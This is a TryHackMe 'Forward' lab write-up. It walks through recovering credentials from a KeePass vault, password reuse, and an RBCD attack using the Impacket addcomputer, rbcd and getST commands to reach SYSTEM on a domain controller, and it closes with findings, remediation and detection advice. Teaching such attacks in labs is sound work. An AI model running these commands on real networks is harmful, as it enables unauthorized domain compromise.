---
title: "TryHackMe: Forward"
date: 2026-06-12 23:45:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - keepass
  - password-reuse
  - bloodhound
  - rbcd
  - kerberos
  - constrained-delegation
  - smb
  - privilege-escalation
description: >-
  Forward chains credential recovery from a user-accessible KeePass vault,
  password reuse, excessive Active Directory object permissions, and
  Resource-Based Constrained Delegation into SYSTEM access on the domain controller.
author: lenovolegion7
media_subpath: /images/tryhackme_forward
image:
  path: room_image.webp
  alt: "Original TryHackMe Forward room artwork"
toc: true
comments: false
---

Forward is an Active Directory challenge built around credential exposure, password reuse, delegated directory permissions, and Resource-Based Constrained Delegation. Starting from the supplied low-privileged `j.smith` account, the validated path recovered a help-desk credential from KeePass, reused that password to access `r.williams`, abused `AddAllowedToAct` over the domain controller, and finished with a Kerberos-authenticated SYSTEM shell.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Forward room card](room_card.webp){: w="303" h="274" .shadow }](https://tryhackme.com/room/forwardchallenge){: .center }

## Executive Summary

The target was a Windows Server 2019 Active Directory domain controller exposing standard domain services:

```text
53/tcp    DNS
88/tcp    Kerberos
389/tcp   LDAP
445/tcp   SMB
3389/tcp  RDP
3268/tcp  Global Catalog LDAP
9389/tcp  Active Directory Web Services
```

The validated compromise path was:

1. authenticate with the supplied low-privileged `ctf.local\j.smith` account;
2. enumerate readable SMB shares and domain principals;
3. use RDP to inspect the `j.smith` profile;
4. identify `C:\Users\j.smith\Documents\Database.kdbx`;
5. unlock the KeePass database using the Windows user account key option;
6. recover the `t.jones` credential;
7. identify password reuse that also authenticated as `r.williams`;
8. use BloodHound data to identify `r.williams -- AddAllowedToAct --> DC01`;
9. create an attacker-controlled machine account;
10. configure Resource-Based Constrained Delegation on the DC computer object;
11. request a CIFS service ticket while impersonating Administrator;
12. use the Kerberos ticket with SMB tooling;
13. obtain a SYSTEM shell on `DC01`;
14. retrieve the final Administrator objective.

> **Result:** The supplied low-privileged domain account was sufficient to reach Administrator-equivalent access and `NT AUTHORITY\SYSTEM` on the domain controller through credential reuse and RBCD abuse.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Forward lab.

Testing was limited to the room environment. A controlled machine account was created for RBCD validation. No destructive action was required.

## Initial Enumeration

The domain and host were:

```text
Domain: ctf.local
Host:   DC01.ctf.local
```

Representative service discovery:

```console
$ nmap \
  -p53,88,389,445,3389,3268,9389 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

SMB signing was required.

## Initial Access and Share Enumeration

The supplied low-privileged account authenticated to SMB and RDP:

```console
$ nxc smb DC01.ctf.local \
  -u j.smith \
  -p '[REDACTED]' \
  -d ctf.local \
  --shares
```

Readable shares included:

```text
Downloads
NETLOGON
SYSVOL
```

The standard shares did not directly expose plaintext credentials.

## Domain Enumeration

LDAP, RID mapping, and BloodHound-compatible collection identified several relevant principals:

```text
j.smith
t.jones
r.williams
svc.helpdesk
```

Notable relationships included:

```text
j.smith      - initial low-privileged user
t.jones      - Help Desk
r.williams   - Help Desk Senior / sysadmin member
svc.helpdesk - service account with SPNs
```

The `sysadmin` group was notable because it was described as exempt from AppLocker and included `r.williams`.

## KeePass Credential Recovery

During an RDP session as `j.smith`, the following KeePass database was found:

```text
C:\Users\j.smith\Documents\Database.kdbx
```

Offline cracking was not the successful path. The database used the Windows user account key source and could be unlocked from within the logged-in `j.smith` Windows session.

The database disclosed credentials for:

```text
ctf.local\t.jones
```

The password is intentionally redacted:

```text
ctf.local\t.jones : [REDACTED]
```

## Password Reuse and r.williams Access

The recovered `t.jones` password was tested only against the small known user set.

The same password authenticated successfully as:

```text
ctf.local\t.jones
ctf.local\r.williams
```

This password reuse provided access to the account carrying the critical directory permission used in the final escalation.

Representative validation:

```console
$ nxc smb DC01.ctf.local \
  -u loot/users.txt \
  -p '[REDACTED]' \
  -d ctf.local \
  --continue-on-success
```

## RBCD Path to Administrator

BloodHound identified the critical edge:

```text
CTF\r.williams
    |
    | AddAllowedToAct
    v
DC01.CTF.LOCAL
```

`AddAllowedToAct` permits modification of the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer object.

An attacker-controlled machine account was created for the authorized validation:

```console
$ impacket-addcomputer \
  'ctf.local/r.williams:[REDACTED]' \
  -computer-name 'ATTACKERSYSTEM$' \
  -computer-pass '[REDACTED]' \
  -dc-ip TARGET_IP
```

The new machine principal was then added to the RBCD attribute on `DC01`:

```console
$ impacket-rbcd \
  'ctf.local/r.williams:[REDACTED]' \
  -delegate-from 'ATTACKERSYSTEM$' \
  -delegate-to 'DC01$' \
  -action write \
  -dc-ip TARGET_IP
```

A Kerberos service ticket was requested for CIFS on the domain controller while impersonating Administrator:

```console
$ impacket-getST \
  'ctf.local/ATTACKERSYSTEM$:[REDACTED]' \
  -spn 'cifs/DC01.ctf.local' \
  -impersonate Administrator \
  -dc-ip TARGET_IP
```

The ticket itself is not published.

## Administrator-Equivalent Access and SYSTEM Shell

The Kerberos ticket was loaded through `KRB5CCNAME` and used for authenticated SMB access.

Representative flow:

```console
$ export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

$ nxc smb DC01.ctf.local \
  -k \
  --use-kcache \
  --shares
```

The ticket was accepted as Administrator-equivalent access.

A Kerberos-authenticated Impacket shell then returned:

```text
nt authority\system
```

The final objective was located at:

```text
C:\Users\Administrator\Desktop\flag.txt
```

Its value is published only as:

```text
THM{[REDACTED]}
```

## Findings

### F-01 - KeePass Database Unlocked by Windows User Account

- **Severity:** High
- **Affected user:** `j.smith`
- **Affected artifact:** `C:\Users\j.smith\Documents\Database.kdbx`
- **Impact:** recovery of lateral-movement credentials

The KeePass database relied on the Windows user account key source and could be unlocked from the compromised interactive session.

**Remediation:**

- use a strong independent master password;
- combine the vault with a keyfile or hardware-backed protection where appropriate;
- avoid storing lateral-movement credentials in low-privileged user profiles;
- monitor and restrict password-vault access.

### F-02 - Password Reuse Across Help Desk Accounts

- **Severity:** Critical
- **Affected accounts:** `t.jones`, `r.williams`
- **Impact:** lateral movement from Help Desk to a higher-trust account

The password recovered for `t.jones` was reused by `r.williams`.

**Remediation:**

- enforce unique passwords per account;
- rotate all reused credentials;
- use managed password-vault workflows;
- monitor targeted password-spray activity.

### F-03 - r.williams Has AddAllowedToAct on DC01

- **Severity:** Critical
- **Affected principal:** `r.williams`
- **Affected object:** `DC01`
- **Impact:** Administrator impersonation through RBCD

`r.williams` could modify RBCD settings on the domain controller computer object.

**Remediation:**

- remove the `AddAllowedToAct` permission;
- audit `msDS-AllowedToActOnBehalfOfOtherIdentity` on all computer objects;
- prioritize domain controllers for delegation reviews;
- apply tiered administration and least privilege.

### F-04 - Machine Account Creation Enabled Attack Setup

- **Severity:** High
- **Impact:** attacker-controlled principal available for RBCD abuse

A low-privileged context could create a machine account that became the delegated principal in the attack chain.

**Remediation:**

- set `ms-DS-MachineAccountQuota` to `0` unless required;
- delegate computer creation only to approved administrative groups;
- alert on Event ID `4741`;
- monitor computer objects created by non-administrative users.

### F-05 - RDP Access to Domain Controller for Non-Admin Users

- **Severity:** Medium
- **Affected users:** `j.smith`, `t.jones`, `r.williams`
- **Impact:** increased exposure of local artifacts and interactive credential material

Low-privileged users could log on interactively to the domain controller.

**Remediation:**

- restrict interactive DC logon to a minimal administrative group;
- use privileged access workstations or jump hosts;
- separate ordinary help-desk workflows from domain-controller access.

### F-06 - Kerberoastable Service Account with Delegation Flags

- **Severity:** Medium
- **Affected account:** `svc.helpdesk`
- **Impact:** increased Kerberos and delegation attack surface

The account had SPNs and delegation-related configuration. The service ticket did not crack during the assessment, but the configuration increased exposure.

**Remediation:**

- use gMSAs where possible;
- use long random service-account credentials;
- prefer AES-only Kerberos where practical;
- strictly scope delegation;
- review service-account delegation settings regularly.

## Security Impact

The validated chain resulted in complete domain-controller compromise from a low-privileged starting credential.

An attacker with equivalent access could:

- read user-accessible credential vaults;
- recover lateral-movement credentials;
- exploit password reuse;
- modify RBCD configuration on the domain controller;
- impersonate Administrator to CIFS;
- access administrative SMB shares;
- execute commands as `NT AUTHORITY\SYSTEM`;
- access all domain data and privileged credential material available to the DC.

The decisive weakness was the combination of reusable credentials and excessive delegation rights over the domain controller object.

## Detection Opportunities

Useful monitoring controls include:

- alert on access to KeePass databases by unexpected processes or users;
- monitor password spraying across small user sets;
- detect changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`;
- alert on Event ID `4741` for unexpected computer creation;
- monitor S4U2Self and S4U2Proxy ticket activity involving privileged identities;
- alert on CIFS service tickets for Administrator issued through unusual delegated principals;
- monitor RDP logons to domain controllers by non-admin users;
- detect Kerberos-authenticated SMB access followed by service-based SYSTEM execution.

## Remediation Priorities

1. Remove `AddAllowedToAct` from `r.williams` on `DC01`.
2. Rotate all reused help-desk credentials.
3. Remove or relocate lateral-movement credentials from the `j.smith` profile.
4. Set `ms-DS-MachineAccountQuota` to `0` unless explicitly required.
5. Restrict interactive RDP access to domain controllers.
6. Review all RBCD and constrained-delegation settings.
7. Migrate service identities to gMSAs where practical.
8. Add monitoring for machine creation, RBCD writes, and S4U ticket activity.
9. Implement tiered administration for privileged directory objects.

## Retest Plan

1. Confirm the KeePass database cannot be opened from the `j.smith` session without an independent secret.
2. Verify the previously recovered help-desk password no longer authenticates to any other account.
3. Confirm `r.williams` no longer has `AddAllowedToAct` or equivalent control over `DC01`.
4. Verify low-privileged users cannot create arbitrary machine accounts unless approved.
5. Confirm unauthorized RBCD writes to `DC01` fail.
6. Verify Administrator impersonation to CIFS through the previous S4U path fails.
7. Confirm non-admin users cannot RDP to the domain controller.
8. Verify service accounts use strong managed credentials and appropriately scoped delegation.
9. Confirm the previous attack chain no longer reaches SYSTEM on `DC01`.

## Lessons Learned

Forward demonstrates how an Active Directory compromise can be driven by identity and delegation design rather than a software exploit.

A low-privileged interactive session exposed a credential vault. Password reuse converted one recovered secret into access to a more trusted principal, and an excessive `AddAllowedToAct` permission on the domain controller allowed RBCD to collapse the final privilege boundary.

The strongest defensive response is to treat password vaults, credential reuse, machine-account creation, RDP access, and delegation ACLs as one connected Active Directory security boundary.
